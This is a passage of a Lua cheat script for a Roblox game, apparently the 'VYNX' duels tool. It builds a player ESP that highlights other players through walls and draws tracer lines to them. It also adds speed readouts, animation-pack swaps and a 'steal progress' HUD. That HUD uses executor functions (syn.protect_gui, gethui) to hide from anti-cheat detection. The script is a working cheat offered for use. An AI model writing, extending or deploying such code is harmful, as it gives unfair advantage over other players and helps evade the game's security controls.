    titleLbl.Position = UDim2.fromOffset(48, 6)
    titleLbl.Size = UDim2.new(1, -100, 0, 18)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Text = labelText
    titleLbl.TextColor3 = Color3.fromRGB(230, 240, 255)
    titleLbl.Font = Enum.Font.GothamBlack
    titleLbl.TextSize = 12
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left

    local timerLbl = Instance.new("TextLabel", card)
    timerLbl.AnchorPoint = Vector2.new(1, 0)
    timerLbl.Position = UDim2.new(1, -12, 0, 6)
    timerLbl.Size = UDim2.fromOffset(48, 18)
    timerLbl.BackgroundTransparency = 1
    timerLbl.Text = string.format("%.1fs", duration)
    timerLbl.TextColor3 = accent
    timerLbl.Font = Enum.Font.GothamBold
    timerLbl.TextSize = 13
    timerLbl.TextXAlignment = Enum.TextXAlignment.Right

    local track = Instance.new("Frame", card)
    track.Position = UDim2.fromOffset(48, 32)
    track.Size = UDim2.new(1, -60, 0, 6)
    track.BackgroundColor3 = Color3.fromRGB(18, 28, 40)
    track.BorderSizePixel = 0
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local fill = Instance.new("Frame", track)
    fill.Size = UDim2.new(1, 0, 1, 0)
    fill.BackgroundColor3 = accent
    fill.BorderSizePixel = 0
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)

    local startTime = os.clock()
    local finishing = false
    local function closeTimer()
        if finishing then return end
        finishing = true
        M.isRagdollActive = false
        pcall(function()
            if M.headIndicator and M.headIndicator.ragdollTimer then
                M.headIndicator.ragdollTimer.Text = ""
            end
        end)
        TweenService:Create(fill, TweenInfo.new(0.12), {Size = UDim2.new(0, 0, 1, 0)}):Play()
        task.delay(0.12, function()
            if not sg.Parent then return end
            TweenService:Create(card, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.new(0.5, 0, 0, 20),
                BackgroundTransparency = 1,
            }):Play()
            task.delay(0.25, function()
                pcall(function() if sg.Parent then sg:Destroy() end end)
                if M._ragdollGui == sg then M._ragdollGui = nil end
            end)
        end)
    end

    if M.ragdollTimerThread then pcall(task.cancel, M.ragdollTimerThread) end
    M.ragdollTimerThread = task.spawn(function()
        while M.isRagdollActive and sg.Parent do
            local remaining = math.max(0, duration - (os.clock() - startTime))
            M.ragdollTimerRemaining = remaining
            if remaining <= 0 then
                closeTimer()
                break
            end
            timerLbl.Text = string.format("%.1fs", remaining)
            fill.Size = UDim2.new(remaining / duration, 0, 1, 0)
            if M.headIndicator and M.headIndicator.ragdollTimer then
                pcall(function() M.headIndicator.ragdollTimer.Text = string.format("%.1fs", remaining) end)
            end
            task.wait(0.05)
        end
        M.ragdollTimerThread = nil
    end)
end

function M.onHumanoidStateChanged(old,new)
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid");if not hum then return end
    local isRag=(new==Enum.HumanoidStateType.Physics or new==Enum.HumanoidStateType.Ragdoll or new==Enum.HumanoidStateType.FallingDown)
    if isRag and not hum.PlatformStand then
        M.updateRagdollTimer(2.6, "RAGDOLL")
    end
end

function M.onMedusaStateChanged()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum and hum.PlatformStand then
        M.updateRagdollTimer(4.5, "STONE")
    end
end

function M.setupRagdollTriggers()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.StateChanged:Connect(M.onHumanoidStateChanged)
        hum:GetPropertyChangedSignal("PlatformStand"):Connect(M.onMedusaStateChanged)
    end
end

function M.waitForAnimate(char)
    for _ = 1, 40 do
        local a = char:FindFirstChild("Animate")
        if a and a:FindFirstChild("idle") and a:FindFirstChild("run") and a:FindFirstChild("walk") then
            return a
        end
        task.wait(0.1)
    end
    return nil
end

function M.setAnim(animObj, id)
    if animObj and id then
        animObj.AnimationId = "rbxassetid://" .. tostring(id)
    end
end

function M.stopAllTracks(hum)
    if not hum then return end
    for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
        pcall(function() t:Stop(0) end)
    end
end

function M.ensureAnim(folder, name)
    if not folder then return nil end
    local a = folder:FindFirstChild(name)
    if not a then
        a = Instance.new("Animation")
        a.Name = name
        a.Parent = folder
    end
    return a
end

function M.ensureIdleSlots(idleFolder, n)
    if not idleFolder then return end
    n = n or 2
    for i=1,n do
        M.ensureAnim(idleFolder, "Animation" .. i)
    end
end

function M.pick(pack, ...)
    for i = 1, select("#", ...) do
        local k = select(i, ...)
        local v = pack[k]
        if v ~= nil then return v end
    end
    return nil
end

function M.saveOriginalAnimate(char)
    if not char then return end
    local animate = char:FindFirstChild("Animate")
    if not animate then return end

    if M.savedAnimate then
        return
    end

    if M.unwalkEnabled or M.animPackEnabled then
        return
    end
    M.savedAnimate = animate:Clone()
    M._savedAnimateFromChar = char
end

function M.restoreOriginalAnimate(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        M.stopAllTracks(hum)
    end
    local currentAnimate = char:FindFirstChild("Animate")
    if currentAnimate then
        currentAnimate:Destroy()
    end
    if M.savedAnimate then
        local newAnimate = M.savedAnimate:Clone()
        newAnimate.Parent = char
        newAnimate.Disabled = true
        task.wait(0.06)
        newAnimate.Disabled = false
    end
end

function M.resetAnimations(char)
    if not char then return end
    M.restoreOriginalAnimate(char)
end

local applyingAnim = false
local function ensureAnimFolder(animate, folderName)
    if not animate then return nil end
    local f = animate:FindFirstChild(folderName)
    if not f then
        f = Instance.new("StringValue")
        f.Name = folderName
        f.Parent = animate
    end
    return f
end

function M.applyAnimPack(packName)
    if not M.animPackEnabled then
        local char = player.Character
        if char then
            M.resetAnimations(char)
        end
        return false
    end
    if applyingAnim then return false end
    applyingAnim = true

    local ok, result = pcall(function()
        local pack = M.PACKS[packName]
        if not pack then return false end

        local char = player.Character or player.CharacterAdded:Wait()
        M.saveOriginalAnimate(char)

        local animate = M.waitForAnimate(char)
        if not animate then
            -- fallback: wait only for Animate itself
            for _ = 1, 30 do
                animate = char:FindFirstChild("Animate")
                if animate then break end
                task.wait(0.1)
            end
        end
        if not animate then return false end

        local hum = char:FindFirstChildOfClass("Humanoid")
        M.stopAllTracks(hum)

        local walkFolder  = ensureAnimFolder(animate, "walk")
        local runFolder   = ensureAnimFolder(animate, "run")
        local jumpFolder  = ensureAnimFolder(animate, "jump")
        local fallFolder  = ensureAnimFolder(animate, "fall")
        local climbFolder = ensureAnimFolder(animate, "climb")
        local swimFolder  = ensureAnimFolder(animate, "swim")
        local swimIdleFolder = ensureAnimFolder(animate, "swimidle")
        local idleFolder  = ensureAnimFolder(animate, "idle")

        local walkObj  = M.ensureAnim(walkFolder,  "WalkAnim")
        local runObj   = M.ensureAnim(runFolder,   "RunAnim")
        local jumpObj  = M.ensureAnim(jumpFolder,  "JumpAnim")
        local fallObj  = M.ensureAnim(fallFolder,  "FallAnim")
        local climbObj = M.ensureAnim(climbFolder, "ClimbAnim")
        local swimObj  = M.ensureAnim(swimFolder,  "Swim")
        local swimIdleObj = M.ensureAnim(swimIdleFolder, "SwimIdle")

        M.setAnim(walkObj,  M.pick(pack, "WalkAnim", "Walk"))
        M.setAnim(runObj,   M.pick(pack, "RunAnim", "Run"))
        M.setAnim(jumpObj,  M.pick(pack, "JumpAnim", "Jump"))
        M.setAnim(fallObj,  M.pick(pack, "FallAnim", "Fall"))
        M.setAnim(climbObj, M.pick(pack, "ClimbAnim", "Climb"))
        M.setAnim(swimObj,      M.pick(pack, "Swim"))
        M.setAnim(swimIdleObj,  M.pick(pack, "SwimIdle") or M.pick(pack, "Swim"))

        if idleFolder then
            local a1 = M.pick(pack, "Animation1")
            local a2 = M.pick(pack, "Animation2")
            if (not a1 or not a2) and type(pack.Idle) == "table" then
                a1 = a1 or pack.Idle[1]
                a2 = a2 or pack.Idle[2] or pack.Idle[1]
            end
            if a1 or a2 then
                M.ensureIdleSlots(idleFolder, 2)
                local id1 = a1 or a2
                local id2 = a2 or a1 or id1
                M.setAnim(idleFolder:FindFirstChild("Animation1"), id1)
                M.setAnim(idleFolder:FindFirstChild("Animation2"), id2)
            elseif pack.Idle and #pack.Idle > 0 then
                M.ensureIdleSlots(idleFolder, math.max(2, #pack.Idle))
                M.setAnim(idleFolder:FindFirstChild("Animation1"), pack.Idle[1])
                M.setAnim(idleFolder:FindFirstChild("Animation2"), pack.Idle[2] or pack.Idle[1])
            end
        end

        animate.Disabled = true
        task.wait(0.08)
        animate.Disabled = false

        if hum then
            pcall(function()
                hum:ChangeState(Enum.HumanoidStateType.Landed)
                task.wait(0.04)
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end)
        end

        M.animPack = packName
        -- re-apply once after a short delay (Animate can overwrite on enable)
        task.delay(0.35, function()
            if not M.animPackEnabled or M.animPack ~= packName then return end
            local c = player.Character
            if not c then return end
            local an = c:FindFirstChild("Animate")
            if not an then return end
            local p = M.PACKS[packName]
            if not p then return end
            local function re(folderName, animName, key)
                local folder = an:FindFirstChild(folderName)
                local obj = folder and folder:FindFirstChild(animName)
                local id = M.pick(p, key)
                if obj and id then obj.AnimationId = "rbxassetid://" .. tostring(id) end
            end
            re("walk", "WalkAnim", "WalkAnim")
            re("run", "RunAnim", "RunAnim")
            re("jump", "JumpAnim", "JumpAnim")
            re("fall", "FallAnim", "FallAnim")
            re("climb", "ClimbAnim", "ClimbAnim")
            re("swim", "Swim", "Swim")
            re("swimidle", "SwimIdle", "SwimIdle")
            local idle = an:FindFirstChild("idle")
            if idle then
                local a1 = idle:FindFirstChild("Animation1")
                local a2 = idle:FindFirstChild("Animation2")
                if a1 and p.Animation1 then a1.AnimationId = "rbxassetid://" .. tostring(p.Animation1) end
                if a2 and (p.Animation2 or p.Animation1) then a2.AnimationId = "rbxassetid://" .. tostring(p.Animation2 or p.Animation1) end
            end
        end)
        return true
    end)

    applyingAnim = false
    if not ok then
        warn("[VYNX] applyAnimPack error: " .. tostring(result))
        return false
    end
    return result == true
end

function M.createPlayerSpeedGui(plr)
    if plr == player then return end
    if M.playerSpeedGuis[plr] then return end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local old = head:FindFirstChild("MoveePlayerSpeedBB")
    if old then old:Destroy() end
    local bb = Instance.new("BillboardGui")
    bb.Name = "MoveePlayerSpeedBB"
    bb.Size = UDim2.new(0, 80, 0, 24)
    bb.StudsOffset = Vector3.new(0, 2.2, 0)
    bb.AlwaysOnTop = true
    bb.Adornee = head
    bb.Parent = head
    local label = Instance.new("TextLabel", bb)
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.Text = "0"
    label.TextColor3 = CHERRY_ACCENT or Color3.fromRGB(255,255,255)
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
    label.TextStrokeTransparency = 0
    M.addShimmerToLabel(label, CHERRY_ACCENT or Color3.fromRGB(255,255,255), Color3.fromRGB(255,255,255))
    local conn
    conn = char.AncestryChanged:Connect(function(_, parent)
        if not parent then
            M.removePlayerSpeedGui(plr)
            if conn then conn:Disconnect() end
        end
    end)
    M.playerSpeedGuis[plr] = {gui = bb, label = label, conn = conn}
end

function M.removePlayerSpeedGui(plr)
    local data = M.playerSpeedGuis[plr]
    if data then
        if data.conn then data.conn:Disconnect() end
        if data.gui then data.gui:Destroy() end
        M.playerSpeedGuis[plr] = nil
    end
end

function M.updatePlayerSpeed(plr)
    if not M.showPlayerSpeeds then return end
    local data = M.playerSpeedGuis[plr]
    if not data then return end
    local char = plr.Character
    if not char then M.removePlayerSpeedGui(plr); return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local speed = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
    data.label.Text = string.format("%.1f", speed)
end

function M.updateAllPlayerSpeeds()
    for plr, _ in pairs(M.playerSpeedGuis) do M.updatePlayerSpeed(plr) end
end

function M.startPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then return end
    local _psAcc = 0
    M.playerSpeedUpdateConn = RunService.Heartbeat:Connect(function(dt)
        _psAcc = _psAcc + (dt or 0.016)
        if _psAcc < 0.2 then return end
        _psAcc = 0
        M.updateAllPlayerSpeeds()
    end)
end

function M.stopPlayerSpeedUpdates()
    if M.playerSpeedUpdateConn then M.playerSpeedUpdateConn:Disconnect(); M.playerSpeedUpdateConn = nil end
end

function M.togglePlayerSpeeds(on)
    M.showPlayerSpeeds = on
    if on then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then M.createPlayerSpeedGui(plr) end
        end
        M.startPlayerSpeedUpdates()
    else
        for plr, _ in pairs(M.playerSpeedGuis) do M.removePlayerSpeedGui(plr) end
        M.stopPlayerSpeedUpdates()
    end
end

M.espList = M.espList or {}
M._espHighlightCache = M._espHighlightCache or {}
M._espBillboardCache = M._espBillboardCache or {}
M._espTracerCache = M._espTracerCache or {}
M._espConn = nil
M._espLastRun = 0
M._espProfileImageCache = M._espProfileImageCache or {}

function M.removeESP(plr)
    if not plr then return end
    if M._espHighlightCache[plr] then
        pcall(function() M._espHighlightCache[plr]:Destroy() end)
        M._espHighlightCache[plr] = nil
    end
    if M._espBillboardCache[plr] then
        pcall(function() M._espBillboardCache[plr]:Destroy() end)
        M._espBillboardCache[plr] = nil
    end
    if M._espTracerCache[plr] then
        for _, ln in ipairs(M._espTracerCache[plr]) do
            pcall(function() ln.Visible = false; ln:Remove() end)
        end
        M._espTracerCache[plr] = nil
    end
    if M.espList then M.espList[plr] = nil end
end

function M.clearESP()
    for plr in pairs(M._espHighlightCache) do
        pcall(function() M._espHighlightCache[plr]:Destroy() end)
    end
    for plr in pairs(M._espBillboardCache) do
        pcall(function() M._espBillboardCache[plr]:Destroy() end)
    end
    for plr in pairs(M._espTracerCache) do
        for _, ln in ipairs(M._espTracerCache[plr]) do
            pcall(function() ln.Visible = false; ln:Remove() end)
        end
    end
    M._espHighlightCache = {}
    M._espBillboardCache = {}
    M._espTracerCache = {}
    M.espList = {}
end

function M._makeESPTracers()
    if not (Drawing and type(Drawing.new) == "function") then return nil end
    local WHITE = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    local outer = Drawing.new("Line")
    outer.Color = WHITE
    outer.Thickness = 2.2
    outer.Transparency = 0.90
    outer.Visible = false
    local mid = Drawing.new("Line")
    mid.Color = WHITE
    mid.Thickness = 1.2
    mid.Transparency = 0.74
    mid.Visible = false
    local core = Drawing.new("Line")
    core.Color = WHITE
    core.Thickness = 0.6
    core.Transparency = 0.10
    core.Visible = false
    return {outer, mid, core}
end

function M._updateESP()
    if not M.playerESPEnabled then
        if M._espConn then
            pcall(function() M._espConn:Disconnect() end)
            M._espConn = nil
            M.clearESP()
        end
        return
    end
    local now = tick()
    if now - (M._espLastRun or 0) < 0.06 then return end
    M._espLastRun = now
    local camera = workspace.CurrentCamera
    if not camera then return end
    local myChar = player.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    local myPos = myRoot.Position
    local myScreenPos, myOnScreen = camera:WorldToViewportPoint(myPos)
    local myVec = Vector2.new(myScreenPos.X, myScreenPos.Y)
    local currentPlayers = Players:GetPlayers()
    local plrSet = {}
    for _, p in ipairs(currentPlayers) do plrSet[p] = true end
    for plr in pairs(M._espHighlightCache) do
        if not plrSet[plr] then
            pcall(function() M._espHighlightCache[plr]:Destroy() end)
            M._espHighlightCache[plr] = nil
        end
    end
    for plr in pairs(M._espBillboardCache) do
        if not plrSet[plr] then
            pcall(function() M._espBillboardCache[plr]:Destroy() end)
            M._espBillboardCache[plr] = nil
        end
    end
    for plr in pairs(M._espTracerCache) do
        if not plrSet[plr] then
            for _, ln in ipairs(M._espTracerCache[plr]) do
                pcall(function() ln.Visible = false; ln:Remove() end)
            end
            M._espTracerCache[plr] = nil
        end
    end
    for _, plr in ipairs(currentPlayers) do
        if plr == player then continue end
        local char = plr.Character
        if not char then
            if M._espHighlightCache[plr] then
                pcall(function() M._espHighlightCache[plr]:Destroy() end)
                M._espHighlightCache[plr] = nil
            end
            if M._espBillboardCache[plr] then
                pcall(function() M._espBillboardCache[plr]:Destroy() end)
                M._espBillboardCache[plr] = nil
            end
            if M._espTracerCache[plr] then
                for _, ln in ipairs(M._espTracerCache[plr]) do
                    pcall(function() ln.Visible = false end)
                end
            end
            continue
        end
        local tRoot = char:FindFirstChild("HumanoidRootPart")
        local tHead = char:FindFirstChild("Head")
        local tHum = char:FindFirstChildOfClass("Humanoid")
        local alive = tRoot and tHead and tHum and tHum.Health > 0
        if alive then
            local hl = M._espHighlightCache[plr]
            if not hl or not hl.Parent or hl.Parent ~= char then
                if hl then pcall(function() hl:Destroy() end) end
                hl = Instance.new("Highlight")
                hl.Name = "VynxPlayerESP"
                hl.FillColor = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
                hl.FillTransparency = 0.72
                hl.OutlineColor = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
                hl.OutlineTransparency = 0.05
                hl.Adornee = char
                hl.Parent = char
                M._espHighlightCache[plr] = hl
            end
            local bb = M._espBillboardCache[plr]
            if not bb or not bb.Parent then
                if bb then pcall(function() bb:Destroy() end) end
                bb = Instance.new("BillboardGui")
                bb.Name = "ProfilePic"
                bb.Size = UDim2.new(0, 56, 0, 56)
                bb.StudsOffset = Vector3.new(0, 3.8, 0)
                bb.Adornee = tHead
                bb.AlwaysOnTop = true
                bb.Parent = tHead
                local img = Instance.new("ImageLabel", bb)
                img.Size = UDim2.new(1, -6, 1, -6)
                img.Position = UDim2.new(0, 3, 0, 3)
                img.BackgroundTransparency = 1
                img.Image = "rbxassetid://0"
                img.ScaleType = Enum.ScaleType.Fit
                local circle = Instance.new("UICorner", img)
                circle.CornerRadius = UDim.new(1, 0)
                local stroke = Instance.new("UIStroke", img)
                stroke.Name = "EspRing"
                stroke.Color = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
                stroke.Thickness = 1.5
                M._espBillboardCache[plr] = bb
                task.spawn(function()
                    local userId = plr.UserId
                    local url = M._espProfileImageCache[userId]
                    if not url then
                        local success, u = pcall(function()
                            return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
                        end)
                        if success and u and u ~= "" then
                            url = u
                            M._espProfileImageCache[userId] = url
                        else
                            url = "rbxassetid://0"
                        end
                    end
                    if img then img.Image = url end
                end)
            else
                if bb.Adornee ~= tHead then bb.Adornee = tHead end
                bb.Enabled = true
            end
            local lines = M._espTracerCache[plr]
            if not lines then
                lines = M._makeESPTracers()
                M._espTracerCache[plr] = lines or {}
            end
            if lines and #lines > 0 then
                local destPos = tRoot.Position
                local pos, onScreen = camera:WorldToViewportPoint(destPos)
                if onScreen and pos.Z > 0 and myOnScreen then
                    local tVec = Vector2.new(pos.X, pos.Y)
                    for _, ln in ipairs(lines) do
                        ln.From = myVec
                        ln.To = tVec
                        ln.Visible = true
                    end
                else
                    for _, ln in ipairs(lines) do
                        ln.Visible = false
                    end
                end
            end
            M.espList[plr] = { highlight = M._espHighlightCache[plr], avatarBB = M._espBillboardCache[plr] }
        else
            if M._espHighlightCache[plr] then
                pcall(function() M._espHighlightCache[plr]:Destroy() end)
                M._espHighlightCache[plr] = nil
            end
            if M._espBillboardCache[plr] then
                pcall(function() M._espBillboardCache[plr]:Destroy() end)
                M._espBillboardCache[plr] = nil
            end
            if M._espTracerCache[plr] then
                for _, ln in ipairs(M._espTracerCache[plr]) do
                    pcall(function() ln.Visible = false end)
                end
            end
            M.espList[plr] = nil
        end
    end
end

function M.addESP(plr)
    if plr == player then return end
    if not M.playerESPEnabled then return end
    M._updateESP()
end

function M._startESPLoop()
    if M._espConn then pcall(function() M._espConn:Disconnect() end); M._espConn = nil end
    if not M.playerESPEnabled then M.clearESP(); return end
    M._espConn = RunService.Heartbeat:Connect(function() M._updateESP() end)
end

function M._stopESPLoop()
    if M._espConn then pcall(function() M._espConn:Disconnect() end); M._espConn = nil end
    M.clearESP()
end

function M._startEspSpeedLoop() end
function M._stopEspSpeedLoop() end

function M.toggleESP(on)
    M.playerESPEnabled = on == true
    if M.playerESPEnabled then
        M._startESPLoop()
        if not M._espPlayerRemoved then
            M._espPlayerRemoved = Players.PlayerRemoving:Connect(function(p)
                M.removeESP(p)
            end)
            if M.trackConn then M.trackConn(M._espPlayerRemoved) end
        end
    else
        M._stopESPLoop()
        if M._espPlayerAdded then pcall(function() M._espPlayerAdded:Disconnect() end); M._espPlayerAdded = nil end
        if M._espPlayerRemoved then pcall(function() M._espPlayerRemoved:Disconnect() end); M._espPlayerRemoved = nil end
    end
    if M.setPlayerESPVisual then pcall(function() M.setPlayerESPVisual(M.playerESPEnabled) end) end
end

M.headIndicator = nil

function M.setupHeadIndicator(char)
    if not char then return end
    local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 8)
    if not head then return end
    local old = head:FindFirstChild("MoveeHeadIndicator")
    if old then old:Destroy() end

    local bb = Instance.new("BillboardGui")
    bb.Name = "MoveeHeadIndicator"
    bb.Size = UDim2.new(0, 360, 0, 70)
    bb.StudsOffset = Vector3.new(0, 3.2, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 250
    bb.LightInfluence = 0
    bb.ResetOnSpawn = false
    bb.Adornee = head
    bb.Parent = head

    local discordLbl = Instance.new("TextLabel")
    discordLbl.Name = "DiscordTag"
    discordLbl.Size = UDim2.new(1, 0, 0, 28)
    discordLbl.Position = UDim2.new(0, 0, 0, 0)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text = "discord.gg/vynxduels"
    discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordLbl.Font = Enum.Font.GothamBold
    discordLbl.TextSize = 18
    discordLbl.TextScaled = false
    discordLbl.TextStrokeTransparency = 0.35
    discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    discordLbl.TextXAlignment = Enum.TextXAlignment.Center
    discordLbl.Parent = bb
    do
        local oceanDark = Color3.fromRGB(30, 110, 170)
        local oceanMid  = Color3.fromRGB(80, 175, 230)
        local oceanLite = Color3.fromRGB(170, 230, 255)
        local g = Instance.new("UIGradient")
        g.Name = "DiscordOceanGrad"
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, oceanDark),
            ColorSequenceKeypoint.new(0.45, oceanMid),
            ColorSequenceKeypoint.new(1, oceanLite),
        })
        g.Rotation = 0
        g.Parent = discordLbl
    end

    local divLine = Instance.new("Frame")
    divLine.Name = "HeadDivider"
    divLine.Size = UDim2.new(0.62, 0, 0, 2)
    divLine.Position = UDim2.new(0.19, 0, 0, 27)
    divLine.BackgroundColor3 = ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    divLine.BackgroundTransparency = 0.1
    divLine.BorderSizePixel = 0
    divLine.Parent = bb
    do
        local dg = Instance.new("UIGradient", divLine)
        dg.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.5, 0),
            NumberSequenceKeypoint.new(1, 1),
        })
    end

    local speedLbl = Instance.new("TextLabel")
    speedLbl.Name = "SpeedLbl"
    speedLbl.Size = UDim2.new(1, 0, 0, 22)
    speedLbl.Position = UDim2.new(0, 0, 0, 32)
    speedLbl.BackgroundTransparency = 1
    speedLbl.Text = "Speed: 0.0"
    speedLbl.TextColor3 = Color3.fromRGB(230, 230, 235)
    speedLbl.Font = Enum.Font.GothamBold
    speedLbl.TextSize = 16
    speedLbl.TextScaled = false
    speedLbl.TextStrokeTransparency = 0.25
    speedLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    speedLbl.TextXAlignment = Enum.TextXAlignment.Center
    speedLbl.Parent = bb

    local ragdollLbl = Instance.new("TextLabel")
    ragdollLbl.Name = "RagdollTimer"
    ragdollLbl.Size = UDim2.new(1, 0, 0, 14)
    ragdollLbl.Position = UDim2.new(0, 0, 0, 55)
    ragdollLbl.BackgroundTransparency = 1
    ragdollLbl.Text = ""
    ragdollLbl.TextColor3 = Color3.fromRGB(80, 180, 255)
    ragdollLbl.Font = Enum.Font.GothamBlack
    ragdollLbl.TextSize = 13
    ragdollLbl.TextStrokeTransparency = 0.15
    ragdollLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    ragdollLbl.Parent = bb

    M.headIndicator = {bb = bb, discord = discordLbl, speed = speedLbl, ragdollTimer = ragdollLbl, divider = divLine}
    pcall(M.updateHeadTheme)
end

function M.updateHeadTheme()
    if not M.headIndicator then return end
    if M.headIndicator.discord then
        for _, c in ipairs(M.headIndicator.discord:GetChildren()) do
            if c:IsA("UIGradient") or c:IsA("UIStroke") then pcall(function() c:Destroy() end) end
        end
        M.headIndicator.discord.Text = "discord.gg/vynxduels"
        M.headIndicator.discord.TextColor3 = Color3.fromRGB(255, 255, 255)
        M.headIndicator.discord.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        M.headIndicator.discord.TextStrokeTransparency = 0.35
        local oceanDark = Color3.fromRGB(30, 110, 170)
        local oceanMid  = Color3.fromRGB(80, 175, 230)
        local oceanLite = Color3.fromRGB(170, 230, 255)
        local g = Instance.new("UIGradient")
        g.Name = "DiscordOceanGrad"
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, oceanDark),
            ColorSequenceKeypoint.new(0.45, oceanMid),
            ColorSequenceKeypoint.new(1, oceanLite),
        })
        g.Rotation = 0
        g.Parent = M.headIndicator.discord
    end
    if M.headIndicator.speed then
        M.headIndicator.speed.TextColor3 = Color3.fromRGB(230, 230, 235)
        M.headIndicator.speed.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    end
    if M.headIndicator.ragdollTimer then
        M.headIndicator.ragdollTimer.TextColor3 = Color3.fromRGB(80, 180, 255)
        M.headIndicator.ragdollTimer.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        M.headIndicator.ragdollTimer.TextStrokeTransparency = 0.15
    end
    if M.headIndicator.divider and M.headIndicator.divider.Parent then
        M.headIndicator.divider.Visible = true
        M.headIndicator.divider.BackgroundColor3 =
            ((M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200))
    end
end

local speedUpdateConn = nil
function M.startHeadSpeedUpdates()
    if speedUpdateConn then return end
    local _headAcc = 0
    local _lastShown = -1
    speedUpdateConn = RunService.Heartbeat:Connect(function(dt)
        _headAcc = _headAcc + (dt or 0.016)
        if _headAcc < 0.25 then return end
        _headAcc = 0
        if not (M.headIndicator and M.headIndicator.speed) then return end
        local displaySpeed
        if M.autoLeftEnabled or M.autoRightEnabled then
            displaySpeed = M.NS
        else
            displaySpeed = M.getActiveMoveSpeed()
        end
        if type(displaySpeed) ~= "number" then displaySpeed = 0 end
        local shown = math.floor(displaySpeed + 0.5)
        if shown ~= _lastShown then
            _lastShown = shown
            M.headIndicator.speed.Text = string.format("Speed: %.1f", displaySpeed)
        end
    end)
end

function M.stopHeadSpeedUpdates()
    if speedUpdateConn then
        speedUpdateConn:Disconnect()
        speedUpdateConn = nil
    end
end

function M.buildTopBanner()
    if M._topBannerConn then
        pcall(function() M._topBannerConn:Disconnect() end)
        M._topBannerConn = nil
    end
    if M.topBannerGui then
        pcall(function() M.topBannerGui:Destroy() end)
        M.topBannerGui = nil
    end
end

function M.buildNewStatusUI()
    if M.statusGui then pcall(function() M.statusGui:Destroy() end); M.statusGui = nil end
    if M._stealBarStatsConn then pcall(function() M._stealBarStatsConn:Disconnect() end); M._stealBarStatsConn = nil end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxStealProgress"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 50
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    local parented = false
    if gethui then parented = pcall(function() gui.Parent = gethui() end) end
    if not parented then parented = pcall(function() gui.Parent = game:GetService("CoreGui") end) end
    if not parented then gui.Parent = player:WaitForChild("PlayerGui") end

    local barW = math.clamp(tonumber(M.stealBarSize) or 280, 220, 420)
    local accent = Color3.fromRGB(40, 140, 255)
    local frame = Instance.new("Frame")
    frame.Name = "HudBar"
    frame.Size = UDim2.new(0, barW, 0, 64)
    frame.Position = UDim2.new(0.5, -math.floor(barW / 2), 1, -84)
    frame.BackgroundColor3 = Color3.fromRGB(6, 14, 18)
    frame.BackgroundTransparency = 0.42
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
    do
        local st = Instance.new("UIStroke", frame)
        st.Name = "BlueOutline"
        st.Color = Color3.fromRGB(40, 160, 255)
        st.Thickness = 2.8
        st.Transparency = 0
        st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        st.LineJoinMode = Enum.LineJoinMode.Round
    end
    M.statusHolder = frame
    M.statusMain = frame

    -- Background image on transparent steal bar body
    local stealBg = Instance.new("ImageLabel")
    stealBg.Name = "StealBarBg"
    stealBg.Size = UDim2.new(1, 0, 1, 0)
    stealBg.BackgroundTransparency = 1
    stealBg.BorderSizePixel = 0
    stealBg.ScaleType = Enum.ScaleType.Crop
    stealBg.ImageTransparency = 0.35
    stealBg.ZIndex = 1
    stealBg.Parent = frame
    Instance.new("UICorner", stealBg).CornerRadius = UDim.new(0, 14)
    pcall(function()
        local id = (M.getSelectedBgId and select(1, M.getSelectedBgId())) or 74584689202918
        stealBg.Image = "rbxassetid://" .. tostring(id)
    end)
    M.statusBarBg = stealBg
    -- dark veil so text stays readable
    local veil = Instance.new("Frame")
    veil.Name = "StealBarVeil"
